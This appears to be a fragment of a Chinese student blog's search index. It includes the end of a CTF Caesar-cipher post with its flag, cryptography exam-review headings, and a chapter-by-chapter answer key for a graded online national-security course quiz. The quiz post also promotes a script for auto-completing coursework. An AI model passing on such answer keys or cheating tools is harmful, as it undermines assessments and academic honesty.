<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>cyberpeace{you_have_learned_caesar_encryption}</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学引论复习</title>
    <url>/posts/a5daf678.html</url>
    <content><![CDATA[<h2 id="密码体制分类-P7"><a href="#密码体制分类-P7" class="headerlink" title="密码体制分类 P7"></a>密码体制分类 P7</h2><p>密码体制从原理上可分为两大类，单钥体制和双钥体制。</p>
<ul>
<li>单钥体制：加密和解密使用同一个密钥。系统的安全性依赖于对密钥的保密，与算法的保密性无关。</li>
<li>双钥体制：加密和解密使用不同的密钥。主要特点是加密和解密能力分开，可以实现多个用户加密的消息，只有拥有解密能力的用户才能解密，或一个用户加密的消息而使多用户可以解读。</li>
</ul>
<h2 id="密码攻击概述-P7"><a href="#密码攻击概述-P7" class="headerlink" title="密码攻击概述 P7"></a>密码攻击概述 P7</h2><table>
<thead>
<tr>
<th>攻击类型</th>
<th>攻击者掌握的内容</th>
</tr>
</thead>
<tbody><tr>
<td>唯密文攻击</td>
<td>- 加密算法<br />- 截获的部分密文</td>
</tr>
<tr>
<td>已知明文攻击</td>
<td>- 加密算法<br />- 截获的部分密文<br />- 一个或多个明文密文对</td>
</tr>
<tr>
<td>选择明文攻击</td>
<td>- 加密算法<br />- 截获的部分密文<br />- 自己选择的明文消息，及有密钥产生的相应密文</td>
</tr>
<tr>
<td>选择密文攻击</td>
<td>- 加密算法<br />- 截获的部分密文<br />- 自己选择的密文消息，及相应的被解密的明文</td>
</tr>
</tbody></table>
<h2 id="几种古典密码-P8"><a href="#几种古典密码-P8" class="headerlink" title="几种古典密码 P8"></a>几种古典密码 P8</h2><h3 id="单表代换密码-P9"><a href="#单表代换密码-P9" class="headerlink" title="单表代换密码 P9"></a>单表代换密码 P9</h3><ol>
<li>凯撒密码</li>
<li>移位密码</li>
<li>仿射密码</li>
</ol>
<p>比较简单</p>
<h3 id="多表代换密码-P10"><a href="#多表代换密码-P10" class="headerlink" title="多表代换密码 P10"></a>多表代换密码 P10</h3><p>行乘以列，相加，可以先 mod 再求和</p>
<p>解密就是逆矩阵，再进行上面操作</p>
<h2 id="流密码的基本概念-P13"><a href="#流密码的基本概念-P13" class="headerlink" title="流密码的基本概念 P13"></a>流密码的基本概念 P13</h2><p>流密码的基本思想是：利用秘钥 $$ k $$，产生一个密钥流 $$ <code>z = z_0 z_1 z_2 \ldots</code> $$，并使用如下规则对明文串 $$ <code>x = x_0 x_1 x_2 \ldots</code> $$ 加密：$$ <code>y = y_0 y_1 y_2 \ldots = E_&#123;z_0&#125;(x_0) E_&#123;z_1&#125;(x_1) E_&#123;z_2&#125;(x_2) \ldots</code> $$<br>有记忆元件</p>
<h2 id="流密码的基本概念-P13-1"><a href="#流密码的基本概念-P13-1" class="headerlink" title="流密码的基本概念 P13"></a>流密码的基本概念 P13</h2><h3 id="有限状态自动机-P14"><a href="#有限状态自动机-P14" class="headerlink" title="有限状态自动机 P14"></a>有限状态自动机 P14</h3><h2 id="线性反馈移位寄存器-P16"><a href="#线性反馈移位寄存器-P16" class="headerlink" title="线性反馈移位寄存器 P16"></a>线性反馈移位寄存器 P16</h2><ul>
<li>n 级线性反馈移位寄存器最多有 $$ 2^n $$ 个状态。</li>
<li>n 级线性反馈移位寄存器的状态周期小于等于 $$ 2^n - 1 $$</li>
<li>输出序列的周期也小于等于 $$ 2^n - 1 $$</li>
<li>只要选择合适的反馈函数，就可以使输出序列的周期达到最大值 $$ 2^n - 1 $$，周期达到最大值的序列称为 m 序列。</li>
</ul>
<h2 id="分组密码概述-P32"><a href="#分组密码概述-P32" class="headerlink" title="分组密码概述 P32"></a>分组密码概述 P32</h2><h3 id="扩散和混淆-P34"><a href="#扩散和混淆-P34" class="headerlink" title="扩散和混淆 P34"></a>扩散和混淆 P34</h3><h3 id="Feistel-密码结构-P35"><a href="#Feistel-密码结构-P35" class="headerlink" title="Feistel 密码结构 P35"></a>Feistel 密码结构 P35</h3><h2 id="数据加密标准-P38"><a href="#数据加密标准-P38" class="headerlink" title="数据加密标准 P38"></a>数据加密标准 P38</h2><h3 id="DES-描述-P38"><a href="#DES-描述-P38" class="headerlink" title="DES 描述 P38"></a>DES 描述 P38</h3><h3 id="二重-DESP43"><a href="#二重-DESP43" class="headerlink" title="二重 DESP43"></a>二重 DESP43</h3><h3 id="两个秘钥的三重-DESP44"><a href="#两个秘钥的三重-DESP44" class="headerlink" title="两个秘钥的三重 DESP44"></a>两个秘钥的三重 DESP44</h3><h3 id="三个秘钥的三重-DESP44"><a href="#三个秘钥的三重-DESP44" class="headerlink" title="三个秘钥的三重 DESP44"></a>三个秘钥的三重 DESP44</h3><h2 id="分组密码的运行模式-P47"><a href="#分组密码的运行模式-P47" class="headerlink" title="分组密码的运行模式 P47"></a>分组密码的运行模式 P47</h2><h3 id="电子码本模式-P47"><a href="#电子码本模式-P47" class="headerlink" title="电子码本模式 P47"></a>电子码本模式 P47</h3><h3 id="密码分组链接模式-P48"><a href="#密码分组链接模式-P48" class="headerlink" title="密码分组链接模式 P48"></a>密码分组链接模式 P48</h3><h3 id="密码反馈模式-P49"><a href="#密码反馈模式-P49" class="headerlink" title="密码反馈模式 P49"></a>密码反馈模式 P49</h3><h3 id="输出反馈模式-P51"><a href="#输出反馈模式-P51" class="headerlink" title="输出反馈模式 P51"></a>输出反馈模式 P51</h3><h2 id="AES-算法——Rijndael-P58"><a href="#AES-算法——Rijndael-P58" class="headerlink" title="AES 算法——Rijndael P58"></a>AES 算法——Rijndael P58</h2><h3 id="Rijndael-的数学基础和设计思想-P58"><a href="#Rijndael-的数学基础和设计思想-P58" class="headerlink" title="Rijndael 的数学基础和设计思想 P58"></a>Rijndael 的数学基础和设计思想 P58</h3><h3 id="算法说明-P61"><a href="#算法说明-P61" class="headerlink" title="算法说明 P61"></a>算法说明 P61</h3><h2 id="密码学中一些常用的数学知识-P83"><a href="#密码学中一些常用的数学知识-P83" class="headerlink" title="密码学中一些常用的数学知识 P83"></a>密码学中一些常用的数学知识 P83</h2><h3 id="费马定理、欧拉定理、卡米歇尔定理-P89"><a href="#费马定理、欧拉定理、卡米歇尔定理-P89" class="headerlink" title="费马定理、欧拉定理、卡米歇尔定理 P89"></a>费马定理、欧拉定理、卡米歇尔定理 P89</h3><h3 id="欧几里得算法-P95"><a href="#欧几里得算法-P95" class="headerlink" title="欧几里得算法 P95"></a>欧几里得算法 P95</h3><h2 id="公钥密码体制的基本概念-P109"><a href="#公钥密码体制的基本概念-P109" class="headerlink" title="公钥密码体制的基本概念 P109"></a>公钥密码体制的基本概念 P109</h2><h2 id="RSA-算法-P113（简单带过）"><a href="#RSA-算法-P113（简单带过）" class="headerlink" title="RSA 算法 P113（简单带过）"></a>RSA 算法 P113（简单带过）</h2><h2 id="椭圆曲线密码体制-P124（了解就行）"><a href="#椭圆曲线密码体制-P124（了解就行）" class="headerlink" title="椭圆曲线密码体制 P124（了解就行）"></a>椭圆曲线密码体制 P124（了解就行）</h2><h2 id="第四章习题-P133"><a href="#第四章习题-P133" class="headerlink" title="第四章习题 P133"></a>第四章习题 P133</h2><h2 id="密钥分配与密钥管理-P135"><a href="#密钥分配与密钥管理-P135" class="headerlink" title="密钥分配与密钥管理 P135"></a>密钥分配与密钥管理 P135</h2><h3 id="密钥的分层控制-P137"><a href="#密钥的分层控制-P137" class="headerlink" title="密钥的分层控制 P137"></a>密钥的分层控制 P137</h3><h2 id="公钥加密体制的密钥管理-P143"><a href="#公钥加密体制的密钥管理-P143" class="headerlink" title="公钥加密体制的密钥管理 P143"></a>公钥加密体制的密钥管理 P143</h2><h2 id="Diffie-Hellman-密钥交换-P143"><a href="#Diffie-Hellman-密钥交换-P143" class="headerlink" title="Diffie-Hellman 密钥交换 P143"></a>Diffie-Hellman 密钥交换 P143</h2><h2 id="消息认证和哈希函数-P156"><a href="#消息认证和哈希函数-P156" class="headerlink" title="消息认证和哈希函数 P156"></a>消息认证和哈希函数 P156</h2><h3 id="消息认证码的定义及使用方式-P157"><a href="#消息认证码的定义及使用方式-P157" class="headerlink" title="消息认证码的定义及使用方式 P157"></a>消息认证码的定义及使用方式 P157</h3><h3 id="哈希函数的定义及使用方式-P161"><a href="#哈希函数的定义及使用方式-P161" class="headerlink" title="哈希函数的定义及使用方式 P161"></a>哈希函数的定义及使用方式 P161</h3><h3 id="哈希函数应满足的条件-P162"><a href="#哈希函数应满足的条件-P162" class="headerlink" title="哈希函数应满足的条件 P162"></a>哈希函数应满足的条件 P162</h3><h3 id="迭代型哈希函数的一般结构-P163"><a href="#迭代型哈希函数的一般结构-P163" class="headerlink" title="迭代型哈希函数的一般结构 P163"></a>迭代型哈希函数的一般结构 P163</h3><h2 id="数字签名和认证协议-P182"><a href="#数字签名和认证协议-P182" class="headerlink" title="数字签名和认证协议 P182"></a>数字签名和认证协议 P182</h2><h3 id="数字签名的基本概念-P182"><a href="#数字签名的基本概念-P182" class="headerlink" title="数字签名的基本概念 P182"></a>数字签名的基本概念 P182</h3><h2 id="数字签名标准-P186"><a href="#数字签名标准-P186" class="headerlink" title="数字签名标准 P186"></a>数字签名标准 P186</h2><h3 id="DSS-的基本方式-P186"><a href="#DSS-的基本方式-P186" class="headerlink" title="DSS 的基本方式 P186"></a>DSS 的基本方式 P186</h3><h3 id="数字签名算法-DSA-P187"><a href="#数字签名算法-DSA-P187" class="headerlink" title="数字签名算法 DSA P187"></a>数字签名算法 DSA P187</h3><h2 id="第七章习题-P201"><a href="#第七章习题-P201" class="headerlink" title="第七章习题 P201"></a>第七章习题 P201</h2>]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>复习</tag>
      </tags>
  </entry>
  <entry>
    <title>常用在线计算工具</title>
    <url>/posts/4b4dd526.html</url>
    <content><![CDATA[<h1 id="概率论与数理统计"><a href="#概率论与数理统计" class="headerlink" title="概率论与数理统计"></a>概率论与数理统计</h1><p><a class="link"   href="https://www.23bei.com/tool/147.html" >排列组合在线计算器 (23bei.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>在线计算工具</category>
      </categories>
      <tags>
        <tag>计算工具</tag>
      </tags>
  </entry>
  <entry>
    <title>当代大学生国家安全教育___2023章节测试答案超星尔雅</title>
    <url>/posts/6430770.html</url>
    <content><![CDATA[<blockquote>
<p>来源：微信公众平台</p>
<p><font color='red'>顺序有少许不对，建议使用浏览器自带的搜索功能进行快速定位</font></p>
<p>为爱发电！</p>
</blockquote>
<p><font color='red' size=15>注意！！！！！</font></p>
<p>博主已经找到刷课脚本，理论上讲本页面答案已经被淘汰，请移步详细阅读<a class="link"   href="https://w1ndys.top/2023/11/03/xxt-plus/#/" >刷课脚本安装使用教程<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，永远坚持无私奉献！</p>
<p><font color='red' size=15>注意！！！！！</font></p>
<p>1【单选题】《七律二首·送瘟神》中“借问瘟君欲何往，纸船明烛照天烧。”这里的“瘟君”指的是（）。</p>
<p>A、鼠疫</p>
<p>B、甲肝</p>
<p>C、肺结核</p>
<p>D、血吸虫病</p>
<p>我的答案：D</p>
<p>2【单选题】《时局图》的配诗“沉沉酣睡我中华，哪知爱国即爱家。国民知醒宜今醒，莫待土分裂似瓜。”该诗作者是中国同盟会会员（）。</p>
<p>A、刘复基</p>
<p>B、谢缵泰</p>
<p>C、陆皓东</p>
<p>D、彭楚藩</p>
<p>我的答案：B</p>
<p>3【多选题】维护国家安全，是坚持和发展中国特色社会主义，实现“两个一百年”奋斗目标和中华民族伟大复兴中国梦的重要保障。国家安全十分重要，国家安全（）。</p>
<p>A、直接关乎国家主权独立和领土完整</p>
<p>B、是人民安居乐业、幸福生活的保障</p>
<p>C、是社会稳定、长治久安的基石</p>
<p>D、是实现中华民族伟大复兴中国梦的重要前提</p>
<p>我的答案：ABCD</p>
<p>1.2</p>
<p>1【单选题】2013年11月召开的党的十八届三中全会决定，成立（），完善国家安全体制和国家安全战略，确保国家安全。</p>
<p>A、国家安全部</p>
<p>B、国家安全领导小组</p>
<p>C、国家安全统筹平台</p>
<p>D、中央国家安全委员会</p>
<p>我的答案：D</p>
<p>2【单选题】我国是一个发展中的社会主义大国，所处的内外环境、历史发展阶段和未来国家发展战略目标，决定了国家安全必须走（）的道路。答案：</p>
<p>A、专门工作</p>
<p>B、群众工作</p>
<p>C、中国特色</p>
<p>D、西方特色</p>
<p>我的答案：C</p>
<p>2.1</p>
<p>1【单选题】（）是国家安全的根本。</p>
<p>A、政治安全</p>
<p>B、军事安全</p>
<p>C、文化安全</p>
<p>D、社会安全</p>
<p>我的答案：A</p>
<p>2【判断题】党的十八大以来，党中央高度重视政治安全，强调坚持总体国家安全观要以政治安全为根本，突出了政治安全的特殊地位。</p>
<p>我的答案：√</p>
<p>3【判断题】政治安全影响着军事安全、经济安全、社会安全、文化安全等各个领域的安全，国家安全的其他要素最终也要反映到维护政治安全上来。</p>
<p>我的答案：√</p>
<p>4【判断题】在2011年公布的《中国的和平发展》白皮书中，我国首次明确界定了六项国家核心利益：国家主权、国家安全、领土完整、国家统一、中国宪法确立的国家政治制度和社会大局稳定、经济社会可持续发展的基本保障。</p>
<p>我的答案：√</p>
<p>2.2</p>
<p>1【单选题】（）是国家政治安全的最高层次，是国家政治安全根本。</p>
<p>A、主权安全</p>
<p>B、政权安全</p>
<p>C、制度安全</p>
<p>D、意识形态安全</p>
<p>我的答案：B</p>
<p>2【单选题】（）说“美国制衡制度结出了政治僵局的恶果。”</p>
<p>A、福山</p>
<p>B、林肯</p>
<p>我的答案：A</p>
<p>3【单选题】（）是国家独立自主地处理对内对外事务的最高权力，是国家独立的根本标志。</p>
<p>A、制度安全</p>
<p>B、政权安全</p>
<p>C、主权安全</p>
<p>D、意识形态安全</p>
<p>我的答案：C</p>
<p>4【多选题】意识形态是党的一项极端重要的工作，必须旗帜鲜明地批驳意识形态的错误思潮，坚定（）。</p>
<p>A、道路自信</p>
<p>B、制度自信</p>
<p>C、理论自信</p>
<p>D、文化自信</p>
<p>我的答案：ABCD</p>
<p>5【判断题】对我国而言，军事安全最为核心的内容是党执政地位的巩固和国家政治秩序的稳定。</p>
<p>我的答案：X</p>
<p>6【判断题】意识形态安全是国家政治安全的有机组成部分，是实现国家政治安全重要的思想武器。</p>
<p>我的答案：√</p>
<p>2.3</p>
<p>1【多选题】当前，政治安全面临的威胁、挑战主要表现在（）方面。ABCD</p>
<p>A、精神懈息、能力不足、脱离群众，消极腐败的危险</p>
<p>B、颜色革命”对我国政治安全构成重大现实威胁</p>
<p>C、我国意识形态领域斗争形势复杂严峻</p>
<p>D、“一国两制”在香港的实践也遇到了新情况、新问题</p>
<p>2【判断题】西方敌对势力对我国实施“西化”“分化”“遏制”的图谋与活动将长期存在，政治安全领域风险错综复杂。</p>
<p>我的答案：√</p>
<p>2.4</p>
<p>1【单选题】“小事不出村，大事不出镇，矛盾不上交”出自（）。</p>
<p>A、镇江经验</p>
<p>B、嘉兴经验</p>
<p>C、枫桥经验</p>
<p>D、盐城经验</p>
<p>我的答案：C</p>
<p>2【多选题】维护政治安全是一项长期复杂的系统工程，应主要采取下列哪些举措（）。</p>
<p>A、全面从严治党，加强党和政府同人民群众的血肉联系</p>
<p>B、坚决防范“颜色革命”，坚决抵制境外势力渗透，坚定社会主义制度自信，加强民主政治和法治建设，加强国家安全防控体系建设</p>
<p>C、做好意识形态工作</p>
<p>D、依法保障“一国两制”实施</p>
<p>我的答案：ABCD</p>
<p>3【判断题】《中华人民共和国香港特别行政区维护国家安全法》颁布实施，迈出了建立健全香港特别行政区维护国家安全的法律制度和执行机制的关键一步。</p>
<p>我的答案：√</p>
<p>3.1</p>
<p>1【多选题】国土安全涵盖（）等要素，是指领土完整、国家统一、海洋权益及边疆边境不受侵犯或威胁的状态。</p>
<p>A、领土</p>
<p>B、自然资源</p>
<p>C、基础设施</p>
<p>D、人口</p>
<p>我的答案：ABC</p>
<p>2【判断题】国土安全是立国之基，是传统安全备受关注的首要方面。</p>
<p>我的答案：√</p>
<p>3.2</p>
<p>1【多选题】国土是国家主权赖以存在的物质空间，包括（）三部分，上至高空，下及底土。</p>
<p>A、领陆</p>
<p>B、领水（包括内水和领海）</p>
<p>C、领空</p>
<p>D、外太空</p>
<p>我的答案：ABC</p>
<p>2【多选题】我国与（）尚未划定陆地边界，领土安全问题尚未完全解决。</p>
<p>A、俄罗斯</p>
<p>B、印度</p>
<p>C、蒙古</p>
<p>D、不丹</p>
<p>我的答案：BD</p>
<p>3【判断题】1992年2月25日全国人大通过的《领海及毗连区法》规定，中华人民共和国领海的宽度从领海基线量起为10海里。</p>
<p>我的答案：X</p>
<p>3.3</p>
<p>1【多选题】长期以来，我坚持与邻为善、以邻为伴，体现（）理念。</p>
<p>A、亲</p>
<p>B、诚</p>
<p>C、惠</p>
<p>D、容</p>
<p>我的答案：ABCD</p>
<p>2【多选题】我国反分裂斗争形势依然错综复杂，比较突出的问题有（）。</p>
<p>A、疆独</p>
<p>B、藏独</p>
<p>C、台独</p>
<p>D、港独</p>
<p>我的答案：ABCD</p>
<p>3【判断题】我国是海陆兼备的国家，陆地边界与16个国家接壤，海上与8个国家相邻。</p>
<p>我的答案：X</p>
<p>3.4</p>
<p>1【多选题】（）是新时期维护国土安全工作提供了新的法律武器。</p>
<p>A、《反分裂国家法》</p>
<p>B、《国家安全法》</p>
<p>C、《反恐怖主义法》</p>
<p>D、《国防法》</p>
<p>我的答案：ABCD</p>
<p>2【判断题】党的十九大作出“坚持陆海统筹，加快建设海洋强国”的部署以来，陆海统筹在体制机制建设、产业、资源、环境和区域协同发展等领域取得重要进展。</p>
<p>我的答案：√</p>
<p>4.1</p>
<p>1【判断题】在传统国家安全观中，军事安全是整个国家安全体系的核心内容，处于首要位置、支柱地位。</p>
<p>我的答案：√</p>
<p>2【判断题】1999年3月24日至6月11日，以美国为首的北约军队，未经联合国安理会授权，对南联盟进行了长达78天的空袭。</p>
<p>我的答案：√</p>
<p>4.2</p>
<p>1【单选题】当今世界战争形态加速向信息化战争演变，（）主导成为制胜关键。</p>
<p>A、非接触性</p>
<p>B、精确性</p>
<p>C、体系</p>
<p>D、信息</p>
<p>我的答案：D</p>
<p>2【判断题】《中国的军事战略》白皮书指出：中国发展仍将处于可以大有作为的重要战略机遇期，外部环境总体有利，但仍然面临多元复杂的安全威胁，遇到的外部阻力和挑战逐步增多。</p>
<p>我的答案：√</p>
<p>4.3</p>
<p>1【多选题】适应武器装备更新换代和作战样式发展变化，要牢牢把握（）的原则。</p>
<p>A、军委管总</p>
<p>B、战区主战</p>
<p>C、军种主建</p>
<p>D、联合训练</p>
<p>我的答案：ABC</p>
<p>2【多选题】我国坚持发展（）的第三方对外军事关系，推动建立公平有效的集体安全机制和军事互信机制。</p>
<p>A、不联合</p>
<p>B、不结盟</p>
<p>C、不对抗</p>
<p>D、不针对</p>
<p>我的答案：BCD</p>
<p>3【判断题】进行军事斗争准备，要把基点放在打赢信息化局部战争上，突出海上军事斗争。</p>
<p>我的答案：√</p>
<p>5.1</p>
<p>1【判断题】经济安全的作用主要体现在保障国防工业、军事装备的生产与供给，重要战略经济资源的供给方面。（）</p>
<p>我的答案：√</p>
<p>2【判断题】经济实力影响和制约着国家的国防、科技、教育等实力，所以说，经济安全事关国家的国际地位。（）</p>
<p>我的答案：√</p>
<p>5.2</p>
<p>1【多选题】以（）的基本经济制度，是中国特色社会主义制度的重要支柱，也是社会主义市场经济体制的根基。只有保持公有制经济的主体地位，才能保证社会主义方向。</p>
<p>A、公有制为主体</p>
<p>B、多种所有制经济共同发展</p>
<p>C、私有制为主体</p>
<p>D、公有制为补充</p>
<p>我的答案：AB</p>
<p>2【多选题】我国根据本国的国情，采取以（）的分配制度，实质上反映出劳动、管理、资本、技术、土地等各种生产要素，都按贡献参与了收益分配。</p>
<p>A、按需分配为主体</p>
<p>B、按劳分配为补充</p>
<p>C、按劳分配为主体</p>
<p>D、多种分配方式并存</p>
<p>我的答案：CD</p>
<p>3【多选题】流通是社会再生产过程中（）中的一个独立的经济活动。流通环节在经济发展中占有非常重要的地位，哪一个环节出现了问题，经济都无法健康发展。</p>
<p>A、生产</p>
<p>B、分配</p>
<p>C、交换（流通）</p>
<p>D、消费</p>
<p>我的答案：ABCD</p>
<p>4【多选题】经济主权安全是指国家独立自主处理经济事务的安全，主要包括（）。</p>
<p>A、独立自主处理经济事务的权力有保障</p>
<p>B、掌握和使用资源的权力</p>
<p>C、独立自主参与国际经济活动的安全</p>
<p>D、独立进行经济建设</p>
<p>我的答案：ABC</p>
<p>5【多选题】经济发展安全主要包括（）。</p>
<p>A、经济发展道路安全</p>
<p>B、经济发展所需人才和物资的安全</p>
<p>C、经济外部环境安全</p>
<p>D、经济文化环境安全</p>
<p>我的答案：AB</p>
<p>5.3</p>
<p>1【多选题】新形势下，（）抬头，经济全球化遭遇波折，多边主义和自由贸易体制受到冲击，不稳定不确定因素依然很多，风险挑战加剧，这对我国的经济安全带来了深层挑战。</p>
<p>A保护主义</p>
<p>B单边主义</p>
<p>C保守主义</p>
<p>D多边主义</p>
<p>我的答案：AB</p>
<p>2【多选题】经济安全面临的国际威胁与挑战有（）。</p>
<p>A金融安全存在风险</p>
<p>B财政安全存在风险</p>
<p>C产业安全存在风险</p>
<p>D粮食安全风险将逐步上升</p>
<p>E经济发展存在滑坡风险</p>
<p>我的答案：ABCDE</p>
<p>3【判断题】全球化背景下，中国经济在国内和国际两个场域下齐头并进，这使得中国经济发展取得了较好的成绩，但是，我国经济面临的国内、国际环境仍很严峻，发展还面临着较大压力。</p>
<p>我的答案：√</p>
<p>5.4</p>
<p>1【多选题】维护经济安全，主要应从维护（）和统筹国内发展与国际合作竞争的关系方面进行。</p>
<p>A、基本经济制度安全</p>
<p>B、构建良好的经济秩序</p>
<p>C、维护经济主权安全</p>
<p>D、实现经济安全发展</p>
<p>我的答案：ABCD</p>
<p>2【多选题】要坚决依法打击（ ）等违法犯罪行为，震慑犯罪分子，提高犯罪成本和难度，降低经济领域的违法犯罪率，确保经济健康有序发展。</p>
<p>A、降低发展速度</p>
<p>B、破坏经济秩序</p>
<p>C、危害企业发展</p>
<p>D、损害市场诚信</p>
<p>我的答案：BCD</p>
<p>3【多选题】维护经济主权安全，主要要做到（）。</p>
<p>A、坚持新发展理念，促进高质量发展</p>
<p>B、强化经济主权意识</p>
<p>C、增强我国综合国力</p>
<p>D、创新和完善宏观调控</p>
<p>我的答案：BC</p>
<p>6.1</p>
<p>1【单选题】（）国家安全委员会在其2000年发布的国家利益报告中，把国家利益分为“致命利益、极端重要利益、重要利益、次要利益”四个等级。</p>
<p>A、中国</p>
<p>B、美国</p>
<p>C、日本</p>
<p>D、英国</p>
<p>我的答案：B</p>
<p>2【判断题】全球化时代，文化软实力的作用被人们深刻认识，富国强兵的“兵”从以往的军事武力转化为当今的文化实力。</p>
<p>我的答案：√</p>
<p>6.2</p>
<p>1【单选题】早在20世纪70年代末，美国的卡特政府就提出（）的文化战略，苏联和东欧阵营的解体在很大程度上是西方这一文化战略的结果。</p>
<p>A、石油外交</p>
<p>B、军事外交</p>
<p>C、人权外交</p>
<p>D、结盟外交</p>
<p>我的答案：C</p>
<p>2【判断题】文化主权是国家主权在文化领域里的延伸，是国家主权不可分割的重要组成部分。</p>
<p>我的答案：√</p>
<p>6.3</p>
<p>1【判断题】境外资本、文化企业、文化产品和服务大量进入国内，对我国维护文化安全带来很大压力。</p>
<p>我的答案：√</p>
<p>2【判断题】境内外各种势力利用互联网散布有害信息、传播错误思想，一些不法分子在网上传播散播低俗信息，网上思想文化争夺日益加剧。</p>
<p>我的答案：√</p>
<p>6.4</p>
<p>1【判断题】提高国家文化软实力， 关系我国在世界文化格局中的定位，关系我国国际地位和国际影响力，关系“两个一百年”奋斗目标和中华民族伟大复兴中国梦的实现。</p>
<p>我的答案：√</p>
<p>2【判断题】中华民族优秀的传统文化包括爱国主义、爱好和平、勤劳勇敢、自强不息等，这是中华民族最有利的文化软实力。</p>
<p>我的答案：√</p>
<p>7.1</p>
<p>1【判断题】维护国家安全，离不开社会的和谐稳定和长治久安。改革开放以来，我们党始终高度重视社会安全，始终把维护社会安定作为一项基础性工作。</p>
<p>我的答案：√</p>
<p>2【判断题】十九届四中全会报告的第九部分中，将国家安全与社会治理、社会稳定合并在一起阐述，充分说明了社会安全与国家安全的密切相关性。</p>
<p>我的答案：√</p>
<p>7.2</p>
<p>1【多选题】社会安全，是指社会处于一种和谐有序和健康发展的状态，以及持续维护社会安全的能力。一般而言，社会安全的主要内容包括（BCD）等相关内容。</p>
<p>A、社会治理</p>
<p>B、社会治安</p>
<p>C、社会安全事件</p>
<p>D、社会舆情</p>
<p>2【多选题】我国社会治安面临着部分地区（ABCD）等“困境”。因此，必须坚定政治立场、持续深入扫黑除恶斗争。</p>
<p>A、扫黑除恶</p>
<p>B、涉众型经济犯罪</p>
<p>C、网络生态空间风险、诈骗案件防治</p>
<p>D、食品安全、涉税犯罪</p>
<p>3【多选题】社会安全事件，主要包括（ABC），以及暴力恐怖主义活动和社会群体性事件等重大安全事件，直接对人民群众生命财产安全造成威胁，严重影响我国社会安全。</p>
<p>A、重大自然灾害</p>
<p>B、重大事故</p>
<p>C、重大公共卫生灾害事件</p>
<p>D、重大舆情</p>
<p>7.3</p>
<p>1【多选题】新形势下我国社会安全面临的威胁和挑战增多，特别是各种威胁和挑战联动效应明显。具体包括（ABCD）。</p>
<p>A、暴力恐怖活动多发，严重影响社会安全</p>
<p>B、社会治安问题突出，影响公众安全感</p>
<p>C、社会矛盾积聚，加大社会安全风险</p>
<p>D、网络公共安全问题凸显，给社会安全带来挑战</p>
<p>2【多选题】我国仍处于刑事犯罪的高发期，违法犯罪活动日趋（ABD），严重暴力犯罪，案件突出，高新技术犯罪、网络犯罪增多，对传统公共安全工作提出挑战。</p>
<p>A、暴力化</p>
<p>B、组织化</p>
<p>C、年青化</p>
<p>D、职业化</p>
<p>3【判断题】改革开放以来，我国社会加速转型，积聚了诸如生产责任事故高发、劳资冲突不断、社会道德失范、信任危机加深之类的社会风险因素，出现了不同社会发展阶段，风险因素交织叠加的特征。</p>
<p>我的答案：√</p>
<p>4【判断题】全力打击暴力恐怖犯罪、坚决依法惩处暴恐分子，为人民群众建立安定有序、繁荣和谐的社会环境，既是民心所昐，也是众望所归。</p>
<p>我的答案：√</p>
<p>7.4</p>
<p>1【多选题】维护社会安全，稳步提升人民群众的安全感和满意度，要切实做到（ABCD）。</p>
<p>A、切实维护公共安全</p>
<p>B、深入开展反恐怖斗争</p>
<p>C、有效预防和妥善处置群体性事件</p>
<p>D、切实维护网络社会安全</p>
<p>2【判断题】</p>
<p>传统违法犯罪加速向网上发展蔓延，电信诈骗、窃取公民个人信息等新型网络犯罪活动不断滋生。</p>
<p>我的答案：√</p>
<p>8.1</p>
<p>1【单选题】（B）是指科技体系完整有效，国家重点领域核心技术安全可控，国家核心利益和安全不受外部科技优势危害，以及保障持续安全状态的能力。</p>
<p>A、技术安全</p>
<p>B、科技安全</p>
<p>C、科学安全</p>
<p>D、科研安全</p>
<p>2【单选题】（C）凭借其科技优势，不会侧重于防范国外科技优势的威胁，更多的是如何通过科技手段威胁敌对国家。</p>
<p>A、发展中国家</p>
<p>B、落后国家</p>
<p>C、发达国家</p>
<p>D、第三世界国家</p>
<p>8.2</p>
<p>1【多选题】科技安全的主要内容包括（ABCD）。</p>
<p>A、科技人才安全</p>
<p>B、科技设施设备安全</p>
<p>C、科技活动安全</p>
<p>D、国防科技安全</p>
<p>2【判断题】科技人才是智力资源，是科技安全最重要的保障。</p>
<p>我的答案：√</p>
<p>8.3</p>
<p>1【判断题】在新技术不断出现和交叉融合态势下，如果不抓住机遇，加快突破，不仅我国现有产业转型升级目标无法实现，而且未来我国重点产业命脉更难以掌握在自己手里。</p>
<p>我的答案：√</p>
<p>2【判断题】</p>
<p>虽然我国科技安全的面貌有了极大改善，但是科技创新基础还不牢固，自主创新特别是原始创新能力还不强，关键领域核心技术受制于人的局面没有得到根本改善。</p>
<p>我的答案：√</p>
<p>8.4</p>
<p>1【单选题】（B）明确规定：国家加强自主创新能力建设，加快发展自主可控的战略高新技术和重要领域核心关键技术，加强知识产权的运用、保护和科技保密能力，保障重大技术和工程的安全。</p>
<p>A、《知识产权法》</p>
<p>B、《国家安全法》</p>
<p>C、《宪法》</p>
<p>D、《网络安全法》</p>
<p>2【判断题】面对科技安全领域的这些风险挑战，关键是要牢牢坚持创新驱动发展战略，努力推动我国科技实力和产业实力实现全面提升。</p>
<p>我的答案：√</p>
<p>9.1</p>
<p>1【单选题】从（C）的角度来说，他们希望对网络信息的访问、读写等操作受到保护和控制。</p>
<p>A、安全保密部门</p>
<p>B、用户</p>
<p>C、网络运行和管理者</p>
<p>D、公众</p>
